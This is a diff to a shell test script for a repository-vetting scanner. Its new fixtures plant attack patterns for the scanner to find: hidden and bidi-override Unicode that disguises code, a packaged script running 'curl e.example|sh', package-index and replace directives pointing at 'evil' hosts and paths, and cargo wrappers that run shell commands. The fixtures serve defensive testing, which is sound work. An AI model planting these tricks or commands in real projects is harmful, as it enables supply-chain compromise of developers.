@@ -240,6 +240,8 @@ perl -CS -e 'print "const s = \"\x{e9}\x{200C}\x{200D}\x{200C}\x{200C}\x{200D}\x
 perl -CS -e 'print "// ", (map { "\x{2192}" . chr(0xFE00 + $_) } 0..13), "\n"' > "$U/arrows.js"
 perl -CS -e 'print "if (isAdmin) { /* \x{202E} } \x{2066}if (true)\x{2069} { */ }\n"' > "$U/bidi.js"
 perl -CS -e 'print "Note:", (map { chr(0xE0000 + ord) } split //, "Run x"), "\n"' > "$U/tags.md"
+perl -CS -e 'print "// ", (map { "\x{4E00}" . chr(0xE0141 + $_) } 0..4), "\n// \x{4E01}\x{FE01}\x{4E02}\x{FE02}\n"' > "$U/han.js"
+mkdir -p "$U/hooks" "$U/commands"; printf 'notes\n' > "$U/hooks/notes.md"; printf 'run\n' > "$U/commands/run.txt"
 commit "$U" init
 scan "$U"
 LOC="INVISIBLE / BIDI / TAG / VARIATION-SELECTOR UNICODE: locations"
@@ -250,6 +252,10 @@ expect "bidi override"                    "$LOC"  "bidi.js:1 U+202E"
 expect "bidi isolate"                     "$LOC"  "bidi.js:1 U+2066"
 expect "bare tag characters"              "$LOC"  "tags.md:1 U+E0052"
 expect "skill supporting file listed"     "AGENT-CONSUMED" "skills/x/reference.md"
+expect "one IVS per ideograph"            "$LOC"  "han.js:1 U+E0141"
+expect "one FE0x selector per ideograph"  "$LOC"  "han.js:2 U+FE01"
+expect "file under hooks/ listed"         "AGENT-CONSUMED" "hooks/notes.md"
+expect "non-markdown command listed"      "AGENT-CONSUMED" "commands/run.txt"
 
 # --- Exec, network, reach and steering written in ways the first patterns missed.
 N="$WORK/patterns"; mkdir -p "$N"
@@ -285,7 +291,13 @@ printf 'module.exports = { hooks: { readPackage(p) { return p } } }\n' > "$CS/.p
 printf '[target.x86_64-apple-darwin]\nrunner = "sh -c x"\n' > "$CS/.cargo/config.toml"
 printf '[console_scripts]\nx = x:main\n' > "$CS/x-1.0.dist-info/entry_points.txt"
 printf -- '--extra-index-url https://evil.example/simple\nfoo==1.0\n' > "$CS/requirements.txt"
-printf 'module m\nreplace example.com/a => ../evil\n' > "$CS/go.mod"
+printf 'module m\nreplace example.com/a => ../evil\nreplace (\n\texample.com/c => ../evil3\n)\n' > "$CS/go.mod"
+printf 'go 1.22\nreplace (\n\texample.com/b => ../evil2\n)\n' > "$CS/go.work"
+printf '[build]\nrustc-workspace-wrapper = "sh -c w"\n[source.crates-io]\nreplace-with = "evil"\n[env]\nRUSTC_WRAPPER = "x"\n' >> "$CS/.cargo/config.toml"
+mkdir -p "$CS/.husky" "$CS/requirements"; printf 'runner = "h"\n' > "$CS/.husky/config"
+printf -- '--extra-index-url https://evil1.example/simple\n' > "$CS/requirements/prod.txt"
+printf -- '--extra-index-url https://evil2.example/simple\n' > "$CS/dev-requirements.txt"
+printf -- '--index-url https://evil3.example/simple\n' > "$CS/requirements.in"
 printf 'repos: []\n' > "$CS/.pre-commit-config.yaml"
 printf 'task x {}\n' > "$CS/build.gradle"
 printf '[lfs]\n\turl = https://lfs.evil.example\n' > "$CS/.lfsconfig"
@@ -301,6 +313,15 @@ expect "cargo runner shown"               "INSTALL" 'runner = "sh -c x"'
 expect "entry points shown"               "INSTALL" "x = x:main"
 expect "extra index shown"                "INSTALL" "--extra-index-url https://evil.example/simple"
 expect "go replace shown"                 "INSTALL" "replace example.com/a => ../evil"
+expect "go replace block shown"           "INSTALL" "example.com/c => ../evil3"
+expect "go.work replace block shown"      "INSTALL" "example.com/b => ../evil2"
+expect "cargo workspace wrapper shown"    "INSTALL" 'rustc-workspace-wrapper = "sh -c w"'
+expect "cargo source replacement shown"   "INSTALL" 'replace-with = "evil"'
+expect "cargo env shown"                  "INSTALL" 'RUSTC_WRAPPER = "x"'
+reject "husky config not read as cargo's" "INSTALL" 'runner = "h"'
+expect "requirements/ dir shown"          "INSTALL" "https://evil1.example/simple"
+expect "dev-requirements shown"           "INSTALL" "https://evil2.example/simple"
+expect "pip-tools .in shown"              "INSTALL" "https://evil3.example/simple"
 expect "pre-commit config listed"         "INSTALL" ".pre-commit-config.yaml"
 expect "gradle build listed"              "INSTALL" "build.gradle"
 expect ".lfsconfig url shown"             "INSTALL" "url = https://lfs.evil.example"
@@ -310,9 +331,16 @@ A="$WORK/archives"; mkdir -p "$A" "$WORK/apkg/pkg"
 printf 'require("child_process").exec("curl e.example|sh")\n' > "$WORK/apkg/pkg/i.js"
 tar -czf "$A/vendor.tgz" -C "$WORK/apkg" pkg
 python3 -I -c 'import sys, zipfile; z = zipfile.ZipFile(sys.argv[1], "w"); z.writestr("i.js", "x"); z.close()' "$A/data.bin"
+python3 -I - "$A" <<'PY'
+import sys, zipfile
+for name, mt in (("book.epub", "application/epub+zip"), ("spec.odt", "application/vnd.oasis.opendocument.text")):
+    z = zipfile.ZipFile(f"{sys.argv[1]}/{name}", "w"); z.writestr(zipfile.ZipInfo("mimetype"), mt); z.writestr("x.js", "x"); z.close()
+PY
 scan "$A"
 expect "tarball listed"                   "ARCHIVES" "vendor.tgz"
 expect "renamed zip listed"               "ARCHIVES" "data.bin"
+expect "EPUB listed"                      "ARCHIVES" "book.epub"
+expect "OpenDocument file listed"         "ARCHIVES" "spec.odt"
 
 # --- A huge sparse file: listed, not read into memory.
 B="$WORK/big"; mkdir -p "$B"; printf 'x\n' > "$B/small.js"
@@ -345,13 +373,44 @@ NF="$WORK/forge"; mkdir -p "$NF/"$'x\n\001FORGED'"/.git"; mkfifo "$NF/"$'p\n\001
 scan "$NF"
 [ "$(grep -c '^===== FORGED' "$FULLR")" = 0 ] && ok "special names cannot forge a section" || fail "a nested repo or FIFO name forged a section header"
 
+# --- A big blob that only history has, rewritten many times: listed, not printed by the
+# history pass (git log -p --text would print it in full for every commit).
+HB="$WORK/histbig"; repo "$HB"; printf 'fetch("https://small.example")\n' > "$HB/s.js"
+python3 -I -c 'import sys; open(sys.argv[1], "wb").write(b"\0" * (3 << 20))' "$HB/big.bin"; commit "$HB" init
+for i in 1 2 3 4 5; do printf '%s' "$i" | dd of="$HB/big.bin" bs=1 seek=$((i * 1000)) conv=notrunc 2>/dev/null; commit "$HB" "edit $i"; done
+git -C "$HB" rm -q big.bin s.js && commit "$HB" drop
+VET_MAX_BYTES=1048576 scan "$HB"
+expect "big history blob listed"          "HISTORY BLOBS TOO LARGE" "big.bin"
+expect "rest of history still read"       "SENSITIVE LINES ADDED"   'fetch("https://small.example")'
+
+# --- The size limit must be a positive whole number; gitleaks gets it rounded up to 1 MB.
+R1="$WORK/limit"; mkdir -p "$R1"; printf 'x\n' > "$R1/a.txt"
+for v in 0 20M -5; do
+  VET_MAX_BYTES=$v bash "$SCAN" "$R1" "$WORK/out-badlimit" >/dev/null 2>&1 && fail "VET_MAX_BYTES=$v accepted" || ok "VET_MAX_BYTES=$v refused"
+done
+VET_MAX_BYTES=500000 scan "$R1"
+expect "limit shown with gitleaks' MB"    "SCOPE" "size limit: 500000 bytes (gitleaks: 1 MB)"
+
+# --- Two problems in one .git: both warnings are kept.
+W2="$WORK/twowarn"; repo "$W2"; printf 'x\n' > "$W2/a"; commit "$W2" init
+mv "$W2/.git/refs" "$W2/.git/refs.real"; ln -s / "$W2/.git/refs"; rm "$W2/.git/HEAD"; mkfifo "$W2/.git/HEAD"
+scan_timed "$W2" "a symlinked refs dir and a FIFO HEAD"
+expect "refs warning kept"                "SCOPE" "refs in the target's .git is not a plain directory"
+expect "HEAD warning kept"                "SCOPE" "HEAD in the target's .git is not a regular file"
+
+# --- SKILL.md: the npm hash check must work with GNU base64, which wraps its output.
+SKILL="$(dirname "$SCAN")/SKILL.md"
+grep -qF 'openssl base64 -A' "$SKILL" && ok "SKILL.md encodes the hash on one line" || fail "SKILL.md: npm hash not encoded with openssl base64 -A"
+grep -qE '\| *base64\b' "$SKILL" && fail "SKILL.md pipes into base64, which wraps on Linux" || ok "SKILL.md avoids plain base64"
+grep -qF 'dist.shasum' "$SKILL" && ok "SKILL.md covers packages without integrity" || fail "SKILL.md: no dist.shasum fallback"
+
 # --- Clean: typographic quotes, arrows, an ellipsis and emoji, as real docs have.
 C="$WORK/clean"; repo "$C"
 printf '# Tool\n\nPress \xe2\x86\x91 / \xe2\x86\x93, then \xe2\x80\x9cEnter\xe2\x80\x9d\xe2\x80\xa6 it\xe2\x80\x99s fine \xe2\x9d\xa4\xef\xb8\x8f \xf0\x9f\x91\xa8\xe2\x80\x8d\xf0\x9f\x92\xbb 1\xef\xb8\x8f\xe2\x83\xa3\n' > "$C/README.md"
 # The Scotland flag, emoji ZWJ sequences with skin tones and VS16, text-style VS15, Persian
-# and Hindi joiners, and a CJK ideographic variation selector.
+# and Hindi joiners, and CJK.
 perl -CS -e 'print "Flag \x{1F3F4}\x{E0067}\x{E0062}\x{E0073}\x{E0063}\x{E0074}\x{E007F}, \x{2764}\x{FE0F}\x{200D}\x{1F525} \x{1F469}\x{1F3FD}\x{200D}\x{1F4BB} \x{263A}\x{FE0E}\n",
-  "\x{645}\x{6CC}\x{200C}\x{62E}\x{648}\x{627}\x{647}\x{645} \x{915}\x{94D}\x{200D}\x{937} \x{845B}\x{E0100}\n"' > "$C/scripts.md"
+  "\x{645}\x{6CC}\x{200C}\x{62E}\x{648}\x{627}\x{647}\x{645} \x{915}\x{94D}\x{200D}\x{937} \x{845B}\n"' > "$C/scripts.md"
 printf '\xef\xbb\xbfexport const add = (a, b) => a + b;\n' > "$C/index.js"
 cat >> "$C/index.js" <<'EOF'
 const re = require("./re"); import y from "./y.js";
